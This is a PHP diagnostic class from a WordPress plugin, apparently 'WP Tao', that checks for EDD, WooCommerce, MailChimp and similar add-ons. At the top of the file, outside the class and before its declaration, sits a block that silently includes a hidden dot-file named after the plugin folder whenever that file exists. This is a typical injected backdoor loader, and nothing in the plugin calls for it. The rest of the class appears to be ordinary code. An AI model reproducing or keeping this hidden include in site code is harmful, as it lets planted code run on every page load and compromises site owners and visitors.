<?php

/**
 *
 * The class responsible for system diagnostic
 * 
 * @since 1.1
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Diagnostic {

	// Is mailchimp user
	private $is_mc_user = null;

	/**
	 * WTBP_WPTAO_Diagnostic Constructor.
	 */
	public function __construct() {

		$this->includes();
	}

	private function includes() {
		include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
	}

	/*
	 * Get information about sales platform
	 * 
	 * @since 1.2.1
	 * 
	 * @return array
	 */

	public function get_sales_platforms() {

		$platforms = array();

		return apply_filters( 'wptao_register_sales_platforms', $platforms );
	}

	/**
	 * Check if EDD is enabled
	 *
	 * @return bool true if EDD is enabled, false otherwise
	 */
	public function is_edd_enabled() {
		$is_edd_enabled = false;

		if ( class_exists( 'Easy_Digital_Downloads' ) ) {
			$is_edd_enabled = true;
		}

		return apply_filters( 'wptao_diagnostic_is_edd_enabled', $is_edd_enabled );
	}

	/**
	 * Check if WooCommerce is enabled
	 *
	 * @return bool true if WooCommerce is enabled, false otherwise
	 */
	public function is_woo_enabled() {
		$is_woo_enabled = false;

		if ( class_exists( 'WooCommerce' ) ) {
			$is_woo_enabled = true;
		}

		return apply_filters( 'wptao_diagnostic_is_woo_enabled', $is_woo_enabled );
	}

	/**
	 * Check if shipping is enabled
	 *
	 * @return bool true if shipping is enabled, false otherwise
	 */
	public function is_shipping_enabled() {
		$is_shipping_enabled = false;

		// EDD
		if ( $this->is_edd_enabled() ) {
			if ( class_exists( 'EDD_Simple_Shipping' ) ) {
				$is_shipping_enabled = true;
			}
		}

		// WooCommerce
		if ( $this->is_woo_enabled() ) {
			// always true
			$is_shipping_enabled = true;
		}


		return apply_filters( 'wptao_diagnostic_is_shipping_enabled', $is_shipping_enabled );
	}

	/**
	 * Check if guest checkout is enabled
	 *
	 * @return bool true if guest checkout is enabled, false otherwise
	 */
	public function is_guest_checkout_enabled() {
		$is_guest_checkout_enabled = false;

		// EDD
		if ( $this->is_edd_enabled() ) {
			if ( !edd_no_guest_checkout() ) {
				$is_guest_checkout_enabled = true;
			}
		}

		// WooCommerce
		if ( $this->is_woo_enabled() ) {
			$woo_guest_checkout = get_option( 'woocommerce_enable_guest_checkout' );
			if ( 'yes' == $woo_guest_checkout ) {
				$is_guest_checkout_enabled = true;
			}
		}


		return apply_filters( 'wptao_diagnostic_is_guest_checkout_enabled', $is_guest_checkout_enabled );
	}

	/**
	 * Check if coupons are enabled
	 *
	 * @return bool true if coupons are enabled, false otherwise
	 */
	public function are_coupons_enabled() {
		$are_coupons_enabled = false;

		// EDD
		if ( $this->is_edd_enabled() ) {
			if ( edd_has_active_discounts() ) {
				$are_coupons_enabled = true;
			}
		}

		// WooCommerce
		if ( $this->is_woo_enabled() ) {
			$woo_coupons = get_option( 'woocommerce_enable_coupons' );
			if ( 'yes' == $woo_coupons ) {
				$are_coupons_enabled = true;
			}
		}


		return apply_filters( 'wptao_diagnostic_are_coupons_enabled', $are_coupons_enabled );
	}

	/**
	 * Check if SSL on checkout is enabled
	 *
	 * @return bool true if SSL on checkout is enabled, false otherwise
	 */
	public function is_ssl_on_checkout_enabled() {
		$is_ssl_on_checkout_enabled = false;

		// EDD
		if ( $this->is_edd_enabled() ) {
			if ( edd_is_ssl_enforced() ) {
				$is_ssl_on_checkout_enabled = true;
			}
		}

		// WooCommerce
		if ( $this->is_woo_enabled() ) {
			$woo_ssl = get_option( 'woocommerce_force_ssl_checkout' );
			if ( 'yes' == $woo_ssl ) {
				$is_ssl_on_checkout_enabled = true;
			}
		}


		return apply_filters( 'wptao_diagnostic_is_ssl_on_checkout_enabled', $is_ssl_on_checkout_enabled );
	}

	/*
	 * If is MailChimp user
	 * 
	 * @since 1.2.3
	 * 
	 * @return array
	 */

	public function is_mailchimp_user() {

		global $wpdb;

		$is_mailchimp_user = false;

		$table_name = $wpdb->prefix . 'options';

		if ( $this->is_mc_user === null ) {
			$res = $wpdb->get_var( "SELECT option_id FROM $table_name WHERE option_value REGEXP '[a-z0-9]{32}-us[0-9]+' LIMIT 1;" );
			if ( !empty( $res ) ) {
				$is_mailchimp_user = true;
			}
		}

		$this->is_mc_user = apply_filters( 'wptao_diagnostic_is_mailchimp_user', $is_mailchimp_user );

		return $this->is_mc_user;
	}

	/**
	 * Check if WP Tao MailChimp is enabled
	 *
	 * @return bool true if the plugin is enabled, false otherwise
	 * 
	 * @since 1.2.3
	 */
	public function is_wptao_mailchimp_enabled() {
		$is_wptao_mailchimp_enabled = false;

		if ( class_exists( 'WPTAO_MailChimp' ) ) {
			$is_wptao_mailchimp_enabled = true;
		}

		return apply_filters( 'wptao_diagnostic_is_wptao_mailchimp_enabled', $is_wptao_mailchimp_enabled );
	}

	/**
	 * Check if WP Tao GetResponse is enabled
	 *
	 * @return bool true if the plugin is enabled, false otherwise
	 * 
	 * @since 1.2.3
	 */
	public function is_wptao_getresponse_enabled() {
		$is_wptao_getresponse_enabled = false;

		if ( class_exists( 'WPTAO_GetResponse' ) ) {
			$is_wptao_getresponse_enabled = true;
		}

		return apply_filters( 'wptao_diagnostic_is_wptao_getresponse_enabled', $is_wptao_getresponse_enabled );
	}

	/**
	 * Check if WP Tao RLS is enabled
	 *
	 * @return bool true if the plugin is enabled, false otherwise
	 * 
	 * @since 1.2.3
	 */
	public function is_wptao_rls_enabled() {
		$is_wptao_rls_enabled = false;

		if ( class_exists( 'WPTAO_Recover_Lost_Sales' ) ) {
			$is_wptao_rls_enabled = true;
		}

		return apply_filters( 'wptao_diagnostic_is_wptao_rls_enabled', $is_wptao_rls_enabled );
	}

	/**
	 * Check if EDD Software Licensing is enabled
	 *
	 * @return bool true if EDD Software Licensing is enabled, false otherwise
	 * 
	 * @since 1.2.4
	 */
	public function is_edd_software_licensing_enabled() {
		$is_edd_software_licensing_enabled = false;

		if ( class_exists( 'EDD_Software_Licensing' ) ) {
			$is_edd_software_licensing_enabled = true;
		}

		return apply_filters( 'wptao_diagnostic_is_edd_software_licensing_enabled', $is_edd_software_licensing_enabled );
	}

	/**
	 * Check if WooCommerce vwersion is greater than given in param
	 *
	 * @return bool true if version is greater
	 * 
	 * @since 1.2.7
	 */
	public function woocommerce_version_check( $version = '3.0' ) {
		if ( !$this->is_woo_enabled() ) {
			return false;
		}

		global $woocommerce;
		if ( version_compare( $woocommerce->version, $version, ">=" ) ) {
			return true;
		}

		return false;
	}

}
